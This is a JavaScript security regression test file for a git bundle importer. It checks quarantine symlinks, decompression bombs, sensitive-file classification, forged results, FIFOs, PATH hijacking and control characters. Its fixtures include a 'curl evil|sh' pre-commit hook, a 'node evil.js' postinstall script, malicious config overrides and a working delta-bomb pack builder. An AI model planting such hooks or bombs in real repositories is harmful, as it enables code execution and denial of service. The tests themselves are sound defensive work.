// drive-bundle-hardening.test.mjs — regressions from the security review of the
// bundle import: planted quarantine, delta bomb, classifier gaps, forged verify
// results, FIFO bundle, plus the low findings. Separate file so the frozen
// drive-bundle tests stay untouched.
import { test } from "node:test";
import assert from "node:assert/strict";
import {
  mkdtempSync, mkdirSync, writeFileSync, readFileSync, readdirSync, existsSync,
  symlinkSync, chmodSync, realpathSync, statSync,
} from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { spawnSync, execFileSync } from "node:child_process";
import { deflateSync } from "node:zlib";
import { createHash } from "node:crypto";

const MOD = new URL("../drive/bundle.mjs", import.meta.url).href;
const SAFE = new URL("../drive/gitsafe.mjs", import.meta.url).href;
const load = () => import("../drive/bundle.mjs");
const loadSafe = () => import("../drive/gitsafe.mjs");

const ID = { name: "Detent Drive", email: "drive@detent.invalid" };
const BRANCH = "refs/heads/sdlc/run1";
const FENV = {
  PATH: process.env.PATH, GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_NOSYSTEM: "1", LC_ALL: "C",
  GIT_AUTHOR_NAME: ID.name, GIT_AUTHOR_EMAIL: ID.email,
  GIT_COMMITTER_NAME: ID.name, GIT_COMMITTER_EMAIL: ID.email,
};

function g(cwd, args, { input, env, raw } = {}) {
  const r = spawnSync("git", args, {
    cwd, input, env: { ...FENV, HOME: cwd, ...env }, encoding: raw ? "buffer" : "utf8", maxBuffer: 1 << 28,
  });
  if (r.status !== 0) throw new Error(`git ${args.join(" ")} failed: ${r.stderr}`);
  return raw ? r.stdout : r.stdout.trim();
}

function buildTree(w, spec) {
  const lines = [];
  for (const [name, v] of Object.entries(spec)) {
    let mode, type, oid;
    if (typeof v === "string") { mode = "100644"; type = "blob"; oid = g(w, ["hash-object", "-w", "--stdin"], { input: v }); }
    else { mode = "040000"; type = "tree"; oid = buildTree(w, v.dir); }
    lines.push(`${mode} ${type} ${oid}\t${name}`);
  }
  return g(w, ["mktree", "-z", "--missing"], { input: lines.join("\0") + "\0" });
}

const BASE_SPEC = { "README.md": "hello\n", "package.json": '{"name":"x"}\n' };

function mkWorld() {
  const root = realpathSync(mkdtempSync(join(tmpdir(), "drive-hard-")));
  const repo = join(root, "repo");
  mkdirSync(repo);
  g(repo, ["init", "-q", "-b", "main"]);
  writeFileSync(join(repo, "README.md"), "hello\n");
  writeFileSync(join(repo, "package.json"), '{"name":"x"}\n');
  g(repo, ["add", "-A"]);
  g(repo, ["commit", "-q", "-m", "base"]);
  const base = g(repo, ["rev-parse", "HEAD"]);
  g(repo, ["branch", "sdlc/run1"]);
  const work = join(root, "work");
  g(root, ["clone", "-q", "--no-local", repo, work]);
  return { root, repo, work, base, scratch: join(root, "scratch"), n: 0 };
}

function commitSpec(w, extra, { message = "work\n" } = {}) {
  const tree = buildTree(w.work, { ...BASE_SPEC, ...extra });
  return g(w.work, ["commit-tree", tree, "-p", w.base], { input: message });
}

function bundle(w, head) {
  const file = join(w.root, `b${w.n++}.bundle`);
  g(w.work, ["update-ref", BRANCH, head]);
  g(w.work, ["bundle", "create", file, BRANCH, `^${w.base}`]);
  return file;
}

async function V(w, file, over = {}) {
  const { verifyBundle } = await load();
  return verifyBundle({
    bundlePath: file, repo: w.repo, base: w.base, branch: BRANCH, identity: ID,
    scratch: w.scratch, step: "s1", ...over,
  });
}

function reject(r, code) {
  assert.equal(r.ok, false, `expected reject ${code}, got ok`);
  assert.equal(r.code, code, `expected ${code}, got ${r.code}: ${JSON.stringify(r.detail)}`);
}

function repoState(repo) {
  const gd = join(repo, ".git");
  return {
    config: readFileSync(join(gd, "config"), "utf8"),
    alternates: existsSync(join(gd, "objects", "info", "alternates")),
    packs: readdirSync(join(gd, "objects", "pack")).sort(),
  };
}

// ---------------------------------------------------------------- H1

test("H1: a symlinked quarantine path is refused and the user repo is untouched", async () => {
  const w = mkWorld();
  const file = bundle(w, commitSpec(w, { "x.txt": "child\n" }));
  mkdirSync(w.scratch, { mode: 0o700 });
  symlinkSync(join(w.repo, ".git"), join(w.scratch, "s1.git"));
  const before = repoState(w.repo);
  reject(await V(w, file), "bad_scratch");
  assert.deepEqual(repoState(w.repo), before);
  assert.ok(existsSync(join(w.repo, ".git", "HEAD")), "user .git survives");
  assert.equal(g(w.repo, ["rev-parse", "--is-bare-repository"]), "false");
});

test("H1: a pre-existing quarantine directory is refused and left alone", async () => {
  const w = mkWorld();
  const file = bundle(w, commitSpec(w, { "x.txt": "child\n" }));
  mkdirSync(join(w.scratch, "s1.git"), { recursive: true, mode: 0o700 });
  writeFileSync(join(w.scratch, "s1.git", "keep"), "x");
  reject(await V(w, file), "bad_scratch");
  assert.ok(existsSync(join(w.scratch, "s1.git", "keep")));
});

test("H1: a symlinked or group-writable scratch directory is refused", async () => {
  const w = mkWorld();
  const file = bundle(w, commitSpec(w, { "x.txt": "child\n" }));
  const real = join(w.root, "real-scratch");
  mkdirSync(real, { mode: 0o700 });
  symlinkSync(real, w.scratch);
  reject(await V(w, file), "bad_scratch");
  const w2 = mkWorld();
  const file2 = bundle(w2, commitSpec(w2, { "x.txt": "child\n" }));
  mkdirSync(w2.scratch);
  chmodSync(w2.scratch, 0o775);
  reject(await V(w2, file2), "bad_scratch");
});

// ---------------------------------------------------------------- M1

const TYPES = { commit: 1, tree: 2, blob: 3 };
function hdr(type, size) {
  const out = [];
  let b = (type << 4) | (size & 15);
  size = Math.floor(size / 16);
  while (size > 0) { out.push(b | 0x80); b = size & 127; size = Math.floor(size / 128); }
  out.push(b);
  return Buffer.from(out);
}
function varint(n) {
  const out = [];
  do { let b = n % 128; n = Math.floor(n / 128); if (n > 0) b |= 0x80; out.push(b); } while (n > 0);
  return Buffer.from(out);
}
function ofsEnc(ofs) {
  const bytes = [ofs & 127];
  while ((ofs >>= 7)) { ofs -= 1; bytes.unshift(128 | (ofs & 127)); }
  return Buffer.from(bytes);
}

function bombBundle(w, head, resultBytes) {
  const objs = g(w.work, ["rev-list", "--objects", `${w.base}..${head}`]).split("\n").map((l) => l.split(" ")[0]);
  const entries = objs.map((oid) => {
    const type = g(w.work, ["cat-file", "-t", oid]);
    const body = g(w.work, ["cat-file", type, oid], { raw: true });
    return Buffer.concat([hdr(TYPES[type], body.length), deflateSync(body)]);
  });
  const BASE_LEN = 0xffffff;
  const baseEntry = Buffer.concat([hdr(3, BASE_LEN), deflateSync(Buffer.alloc(BASE_LEN), { level: 9 })]);
  const n = Math.ceil(resultBytes / BASE_LEN);
  const ins = Buffer.alloc(n * 4);
  for (let i = 0; i < n; i++) { ins[i * 4] = 0xf0; ins[i * 4 + 1] = 0xff; ins[i * 4 + 2] = 0xff; ins[i * 4 + 3] = 0xff; }
  const delta = Buffer.concat([varint(BASE_LEN), varint(n * BASE_LEN), ins]);
  let body = Buffer.concat(entries);
  const baseOfs = 12 + body.length;
  body = Buffer.concat([body, baseEntry]);
  const deltaOfs = 12 + body.length;
  body = Buffer.concat([body, hdr(6, delta.length), ofsEnc(deltaOfs - baseOfs), deflateSync(delta)]);
  const nobj = entries.length + 2;
  const header = Buffer.from([0x50, 0x41, 0x43, 0x4b, 0, 0, 0, 2, (nobj >>> 24) & 255, (nobj >>> 16) & 255, (nobj >>> 8) & 255, nobj & 255]);
  const pack = Buffer.concat([header, body]);
  const full = Buffer.concat([pack, createHash("sha1").update(pack).digest()]);
  const file = join(w.root, "bomb.bundle");
  writeFileSync(file, Buffer.concat([Buffer.from(`# v2 git bundle\n-${w.base} base\n${head} ${BRANCH}\n\n`), full]));
  return file;
}

test("M1: a small bundle that inflates to a huge delta result is rejected before indexing", async () => {
  const w = mkWorld();
  const head = commitSpec(w, { "x.txt": "child\n" });
  const file = bombBundle(w, head, 256 * 2 ** 20);
  assert.ok(statSync(file).size < 64 * 1024, "the bomb itself is tiny");
  const t0 = Date.now();
  reject(await V(w, file), "bundle_too_large");
  assert.ok(Date.now() - t0 < 1000, `took ${Date.now() - t0} ms`);
});

test("M1: a pack object count over the cap is rejected", async () => {
  const w = mkWorld();
  const file = bundle(w, commitSpec(w, { "x.txt": "child\n" }));
  reject(await V(w, file, { caps: { objects: 2 } }), "bundle_too_large");
});

test("M1: objects in the pack that the branch does not reach are rejected", async () => {
  const w = mkWorld();
  const head = commitSpec(w, { "x.txt": "child\n" });
  const junk = g(w.work, ["hash-object", "-w", "--stdin"], { input: "unreachable junk\n" });
  const oids = g(w.work, ["rev-list", "--objects", `${w.base}..${head}`]).split("\n").map((l) => l.split(" ")[0]);
  const pack = spawnSync("git", ["pack-objects", "--stdout"], {
    cwd: w.work, input: [...oids, junk].join("\n") + "\n", env: { ...FENV, HOME: w.work }, maxBuffer: 1 << 26,
  }).stdout;
  const file = join(w.root, "extra.bundle");
  writeFileSync(file, Buffer.concat([Buffer.from(`# v2 git bundle\n-${w.base} base\n${head} ${BRANCH}\n\n`), pack]));
  reject(await V(w, file), "extra_objects");
});

// ---------------------------------------------------------------- M2

const CLASSIFY = {
  "PACKAGE.JSON in a new directory": { tools: { dir: { "PACKAGE.JSON": '{"scripts":{"postinstall":"node evil.js"}}\n' } } },
  "package.json simple-git-hooks": { "package.json": '{"name":"x","simple-git-hooks":{"pre-commit":"curl evil|sh"}}\n' },
  "package.json husky": { "package.json": '{"name":"x","husky":{"hooks":{"pre-commit":"x"}}}\n' },
  "package.json lint-staged": { "package.json": '{"name":"x","lint-staged":{"*":"x"}}\n' },
  "package.json pnpm": { "package.json": '{"name":"x","pnpm":{"overrides":{"a":"npm:evil@1"}}}\n' },
  "binding.gyp": { "binding.gyp": "{}\n" },
  "conftest.py": { "conftest.py": "import os\n" },
  "eslint.config.js": { "eslint.config.js": "x\n" },
  "vite.config.ts": { "vite.config.ts": "x\n" },
  "jest.config.js": { "jest.config.js": "x\n" },
  "babel.config.js": { "babel.config.js": "x\n" },
  ".gitconfig": { ".gitconfig": "[core]\n" },
  "patches/": { patches: { dir: { "a+1.0.0.patch": "x\n" } } },
  ".cursor/": { ".cursor": { dir: { "mcp.json": "{}\n" } } },
  ".zed/": { ".zed": { dir: { "settings.json": "{}\n" } } },
  ".windsurf/": { ".windsurf": { dir: { "rules.md": "x\n" } } },
  "GEMINI.md": { "GEMINI.md": "x\n" },
  "rust-toolchain.toml": { "rust-toolchain.toml": "x\n" },
  Dockerfile: { Dockerfile: "FROM x\n" },
  "CMakeLists.txt": { "CMakeLists.txt": "x\n" },
};

test("M2: every classifier gap from the review is shipBlocking", async () => {
  for (const [label, extra] of Object.entries(CLASSIFY)) {
    const w = mkWorld();
    const r = await V(w, bundle(w, commitSpec(w, extra)));
    assert.equal(r.ok, true, `${label}: ${JSON.stringify(r)}`);
    assert.equal(r.shipBlocking, true, `${label} should be shipBlocking, sensitive=${JSON.stringify(r.sensitive)}`);
  }
});

test("M2: only benign package.json keys stay non-sensitive", async () => {
  const benign = '{"name":"y","version":"2.0.0","description":"d","keywords":["k"],"license":"MIT","private":true}\n';
  const w = mkWorld();
  const r = await V(w, bundle(w, commitSpec(w, { "package.json": benign })));
  assert.equal(r.ok, true, JSON.stringify(r));
  assert.equal(r.shipBlocking, false, JSON.stringify(r.sensitiveDetail));
});

// ---------------------------------------------------------------- M3

test("M3: a forged verify result is refused and its directories are not deleted", async () => {
  const { importBundle } = await load();
  const w = mkWorld();
  const evil = commitSpec(w, { "x.txt": "child\n" });
  g(w.work, ["update-ref", "refs/detent/incoming", evil]);
  const copy = join(w.root, "any.file");
  writeFileSync(copy, "x");
  const forged = {
    ok: true, step: "s1", head: evil, quarantine: join(w.work, ".git"), copy,
    bundle_sha256: createHash("sha256").update("x").digest("hex"),
  };
  const r = importBundle({ verified: forged, repo: w.repo, runId: "run1", expectOld: null });
  reject(r, "bad_verified");
  assert.ok(existsSync(join(w.work, ".git")), "named dir still exists");
  assert.equal(g(w.repo, ["for-each-ref", "refs/heads/detent"]), "");
});

test("M3: mutating a genuine verify result does not redirect the import", async () => {
  const { importBundle } = await load();
  const w = mkWorld();
  const head = commitSpec(w, { "x.txt": "child\n" });
  const v = await V(w, bundle(w, head));
  assert.equal(v.ok, true, JSON.stringify(v));
  const evil = commitSpec(w, { "y.txt": "evil\n" });
  g(w.work, ["update-ref", "refs/detent/incoming", evil]);
  v.quarantine = join(w.work, ".git");
  v.head = evil;
  const r = importBundle({ verified: v, repo: w.repo, runId: "run1", expectOld: null });
  assert.equal(r.ok, true, JSON.stringify(r));
  assert.equal(g(w.repo, ["rev-parse", "refs/heads/detent/run1"]), head);
  assert.ok(existsSync(join(w.work, ".git")));
});

test("L1: import needs only the quarantine, not the bundle copy", async () => {
  const { importBundle } = await load();
  const w = mkWorld();
  const v = await V(w, bundle(w, commitSpec(w, { "x.txt": "child\n" })));
  assert.equal(v.ok, true, JSON.stringify(v));
  writeFileSync(v.copy, "changed after verification");
  const r = importBundle({ verified: v, repo: w.repo, runId: "run1", expectOld: null });
  assert.equal(r.ok, true, JSON.stringify(r));
});

// ---------------------------------------------------------------- M4

function inChild(code, env = process.env, cwd) {
  const r = spawnSync(process.execPath, ["--input-type=module", "-e", code], {
    encoding: "utf8", timeout: 8000, env, cwd,
  });
  assert.ok(!r.error, `child did not finish: ${r.error && r.error.code} ${r.stderr}`);
  return r;
}

test("M4: a FIFO at the bundle path is rejected without blocking", async () => {
  const w = mkWorld();
  const fifo = join(w.root, "out.bundle");
  execFileSync("mkfifo", [fifo]);
  const t0 = Date.now();
  const r = inChild(`
    import { verifyBundle } from ${JSON.stringify(MOD)};
    const r = verifyBundle(${JSON.stringify({
      bundlePath: fifo, repo: w.repo, base: w.base, branch: BRANCH, identity: ID, scratch: w.scratch, step: "s1",
    })});
    console.log(JSON.stringify(r));
  `);
  assert.ok(Date.now() - t0 < 5000);
  const out = JSON.parse(r.stdout.trim().split("\n").pop());
  reject(out, "bad_bundle_file");
});

// ---------------------------------------------------------------- L2 - L5

test("L2: case-folding collisions that differ only under upper-then-lower are caught", async () => {
  const w = mkWorld();
  const c = commitSpec(w, { src: { dir: { "ß.txt": "1\n", "ẞ.txt": "2\n" } } });
  reject(await V(w, bundle(w, c)), "path_collision");
});

test("L3: git is resolved from absolute PATH entries only", async () => {
  const root = realpathSync(mkdtempSync(join(tmpdir(), "drive-path-")));
  mkdirSync(join(root, "bin"));
  const canary = join(root, "canary");
  writeFileSync(join(root, "bin", "git"), `#!/bin/sh\ntouch ${canary}\necho "git version 2.50.0"\n`);
  chmodSync(join(root, "bin", "git"), 0o755);
  const env = { ...process.env, PATH: `bin:${process.env.PATH}` };
  delete env.NODE_TEST_CONTEXT;
  const r = inChild(`
    import { git } from ${JSON.stringify(SAFE)};
    const r = git(["--version"]);
    console.log(r.stdout.toString().trim());
  `, env, root);
  assert.ok(!existsSync(canary), `relative PATH git ran: ${r.stdout}${r.stderr}`);
  assert.match(r.stdout, /^git version \d/);
});

test("L4: gitOpts keys are allowlisted and config cannot override the hardening", async () => {
  const { verifyBundle } = await load();
  const { git } = await loadSafe();
  const w = mkWorld();
  const file = bundle(w, commitSpec(w, { "x.txt": "child\n" }));
  for (const bad of [{ config: ["core.hooksPath=/x"] }, { env: { GIT_DIR: "/x" } }, { cwd: "/" }]) {
    assert.throws(() => verifyBundle({
      bundlePath: file, repo: w.repo, base: w.base, branch: BRANCH, identity: ID,
      scratch: w.scratch, step: "s1", gitOpts: bad,
    }), TypeError);
  }
  assert.throws(() => git(["status"], { config: ["core.hooksPath=/x"] }), (e) => e.code === "git_forbidden");
  assert.throws(() => git(["status"], { config: ["Protocol.Allow=always"] }), (e) => e.code === "git_forbidden");
});

test("L4: test hooks are inert outside a node test run", async () => {
  const env = { ...process.env };
  delete env.NODE_TEST_CONTEXT;
  const r = inChild(`
    import { git, setGitSpy } from ${JSON.stringify(SAFE)};
    import { verifyBundle } from ${JSON.stringify(MOD)};
    const out = {};
    try { setGitSpy(() => {}); out.spy = "accepted"; } catch (e) { out.spy = e.code; }
    try { git(["status"], { gitBin: "/bin/echo" }); out.bin = "accepted"; } catch (e) { out.bin = e.code; }
    try {
      verifyBundle({ bundlePath: "/nonexistent", repo: "/x", base: "a".repeat(40), branch: "refs/heads/sdlc/r",
        identity: { email: "e" }, scratch: "/tmp", step: "s", _afterCopy: () => {} });
      out.after = "accepted";
    } catch (e) { out.after = e.constructor.name; }
    console.log(JSON.stringify(out));
  `, env);
  const out = JSON.parse(r.stdout.trim().split("\n").pop());
  assert.equal(out.spy, "git_forbidden");
  assert.equal(out.bin, "git_forbidden");
  assert.equal(out.after, "TypeError");
});

test("L5: control characters in a commit subject are rejected, tabs are fine", async () => {
  const w = mkWorld();
  reject(await V(w, bundle(w, commitSpec(w, { "x.txt": "1\n" }, { message: "fix \u001b[31mred\n" }))), "bad_message");
  const w2 = mkWorld();
  reject(await V(w2, bundle(w2, commitSpec(w2, { "x.txt": "1\n" }, { message: "c1 \u0085 next\n" }))), "bad_message");
  const w3 = mkWorld();
  const ok = await V(w3, bundle(w3, commitSpec(w3, { "x.txt": "1\n" }, { message: "tab\tseparated\n\nbody\n" })));
  assert.equal(ok.ok, true, JSON.stringify(ok));
});
